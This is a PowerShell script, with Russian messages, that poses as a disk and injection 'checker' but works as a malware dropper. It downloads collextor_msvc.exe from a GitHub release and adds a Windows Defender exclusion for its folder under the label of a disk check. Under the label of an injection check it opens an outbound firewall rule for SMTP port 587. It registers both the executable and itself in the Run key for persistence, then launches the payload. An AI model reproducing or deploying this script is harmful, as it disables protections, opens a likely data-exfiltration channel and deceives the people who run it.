$dir = "$env:USERPROFILE\collextor"
$exe = "$dir\collextor_msvc.exe"
$url = "https://github.com/Holycheck/checker/releases/download/dw/collextor_msvc.exe"

# Путь к самому скрипту (если он сохранён в файл)
$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) {
    $scriptPath = $PSCommandPath
}

New-Item -ItemType Directory -Force -Path $dir | Out-Null

Write-Host "Скачиваю..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $url -OutFile $exe -UseBasicParsing
    Write-Host "Начинаю..." -ForegroundColor Green
} catch {
    Write-Host "Ошибка: $_" -ForegroundColor Red
    pause; exit 1
}

Write-Host "Проверка дисков" -ForegroundColor Cyan
try {
    $svc = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    if ($svc -and $svc.Status -ne 'Running') {
        Start-Service WinDefend -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
    }
    Add-MpPreference -ExclusionPath $dir -ErrorAction Stop
    Write-Host "Проверено" -ForegroundColor Green
} catch {
    Write-Host "недоступен, пропускаю." -ForegroundColor Yellow
}

Write-Host "Проверка инжектов" -ForegroundColor Cyan
try {
    $existing = Get-NetFirewallRule -DisplayName "SMTP Gmail" -ErrorAction SilentlyContinue
    if (-not $existing) {
        New-NetFirewallRule -DisplayName "SMTP Gmail" -Direction Outbound -Protocol TCP -RemotePort 587 -Action Allow -ErrorAction Stop | Out-Null
    }
    Write-Host "Проверка инжектов" -ForegroundColor Green
} catch {
    Write-Host "пропускаю." -ForegroundColor Yellow
}

# ---- ДОБАВЛЯЕМ В АВТОЗАПУСК (и EXE, и сам скрипт) ----
Write-Host "Настройка автозапуска..." -ForegroundColor Cyan
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# 1) Добавляем EXE
try {
    $valueNameExe = "Collextor"
    $currentExe = (Get-ItemProperty -Path $runKey -Name $valueNameExe -ErrorAction SilentlyContinue).$valueNameExe
    if (-not $currentExe -or $currentExe -ne $exe) {
        Set-ItemProperty -Path $runKey -Name $valueNameExe -Value $exe -ErrorAction Stop
        Write-Host "EXE добавлен в автозапуск" -ForegroundColor Green
    } else {
        Write-Host "EXE уже в автозапуске" -ForegroundColor Yellow
    }
} catch {
    Write-Host "Не удалось добавить EXE: $_" -ForegroundColor Red
}

# 2) Добавляем сам скрипт (если он сохранён в файл)
if ($scriptPath -and (Test-Path $scriptPath)) {
    try {
        $valueNameScript = "CollextorScript"
        $cmd = "powershell.exe -ExecutionPolicy Bypass -File `"$scriptPath`""
        $currentScript = (Get-ItemProperty -Path $runKey -Name $valueNameScript -ErrorAction SilentlyContinue).$valueNameScript
        if (-not $currentScript -or $currentScript -ne $cmd) {
            Set-ItemProperty -Path $runKey -Name $valueNameScript -Value $cmd -ErrorAction Stop
            Write-Host "Скрипт добавлен в автозапуск" -ForegroundColor Green
        } else {
            Write-Host "Скрипт уже в автозапуске" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "Не удалось добавить скрипт: $_" -ForegroundColor Red
    }
} else {
    Write-Host "Скрипт не сохранён в файл – автозапуск скрипта невозможен." -ForegroundColor Yellow
}

Write-Host "Анализирую..." -ForegroundColor Green
Start-Process -FilePath $exe -WorkingDirectory $dir
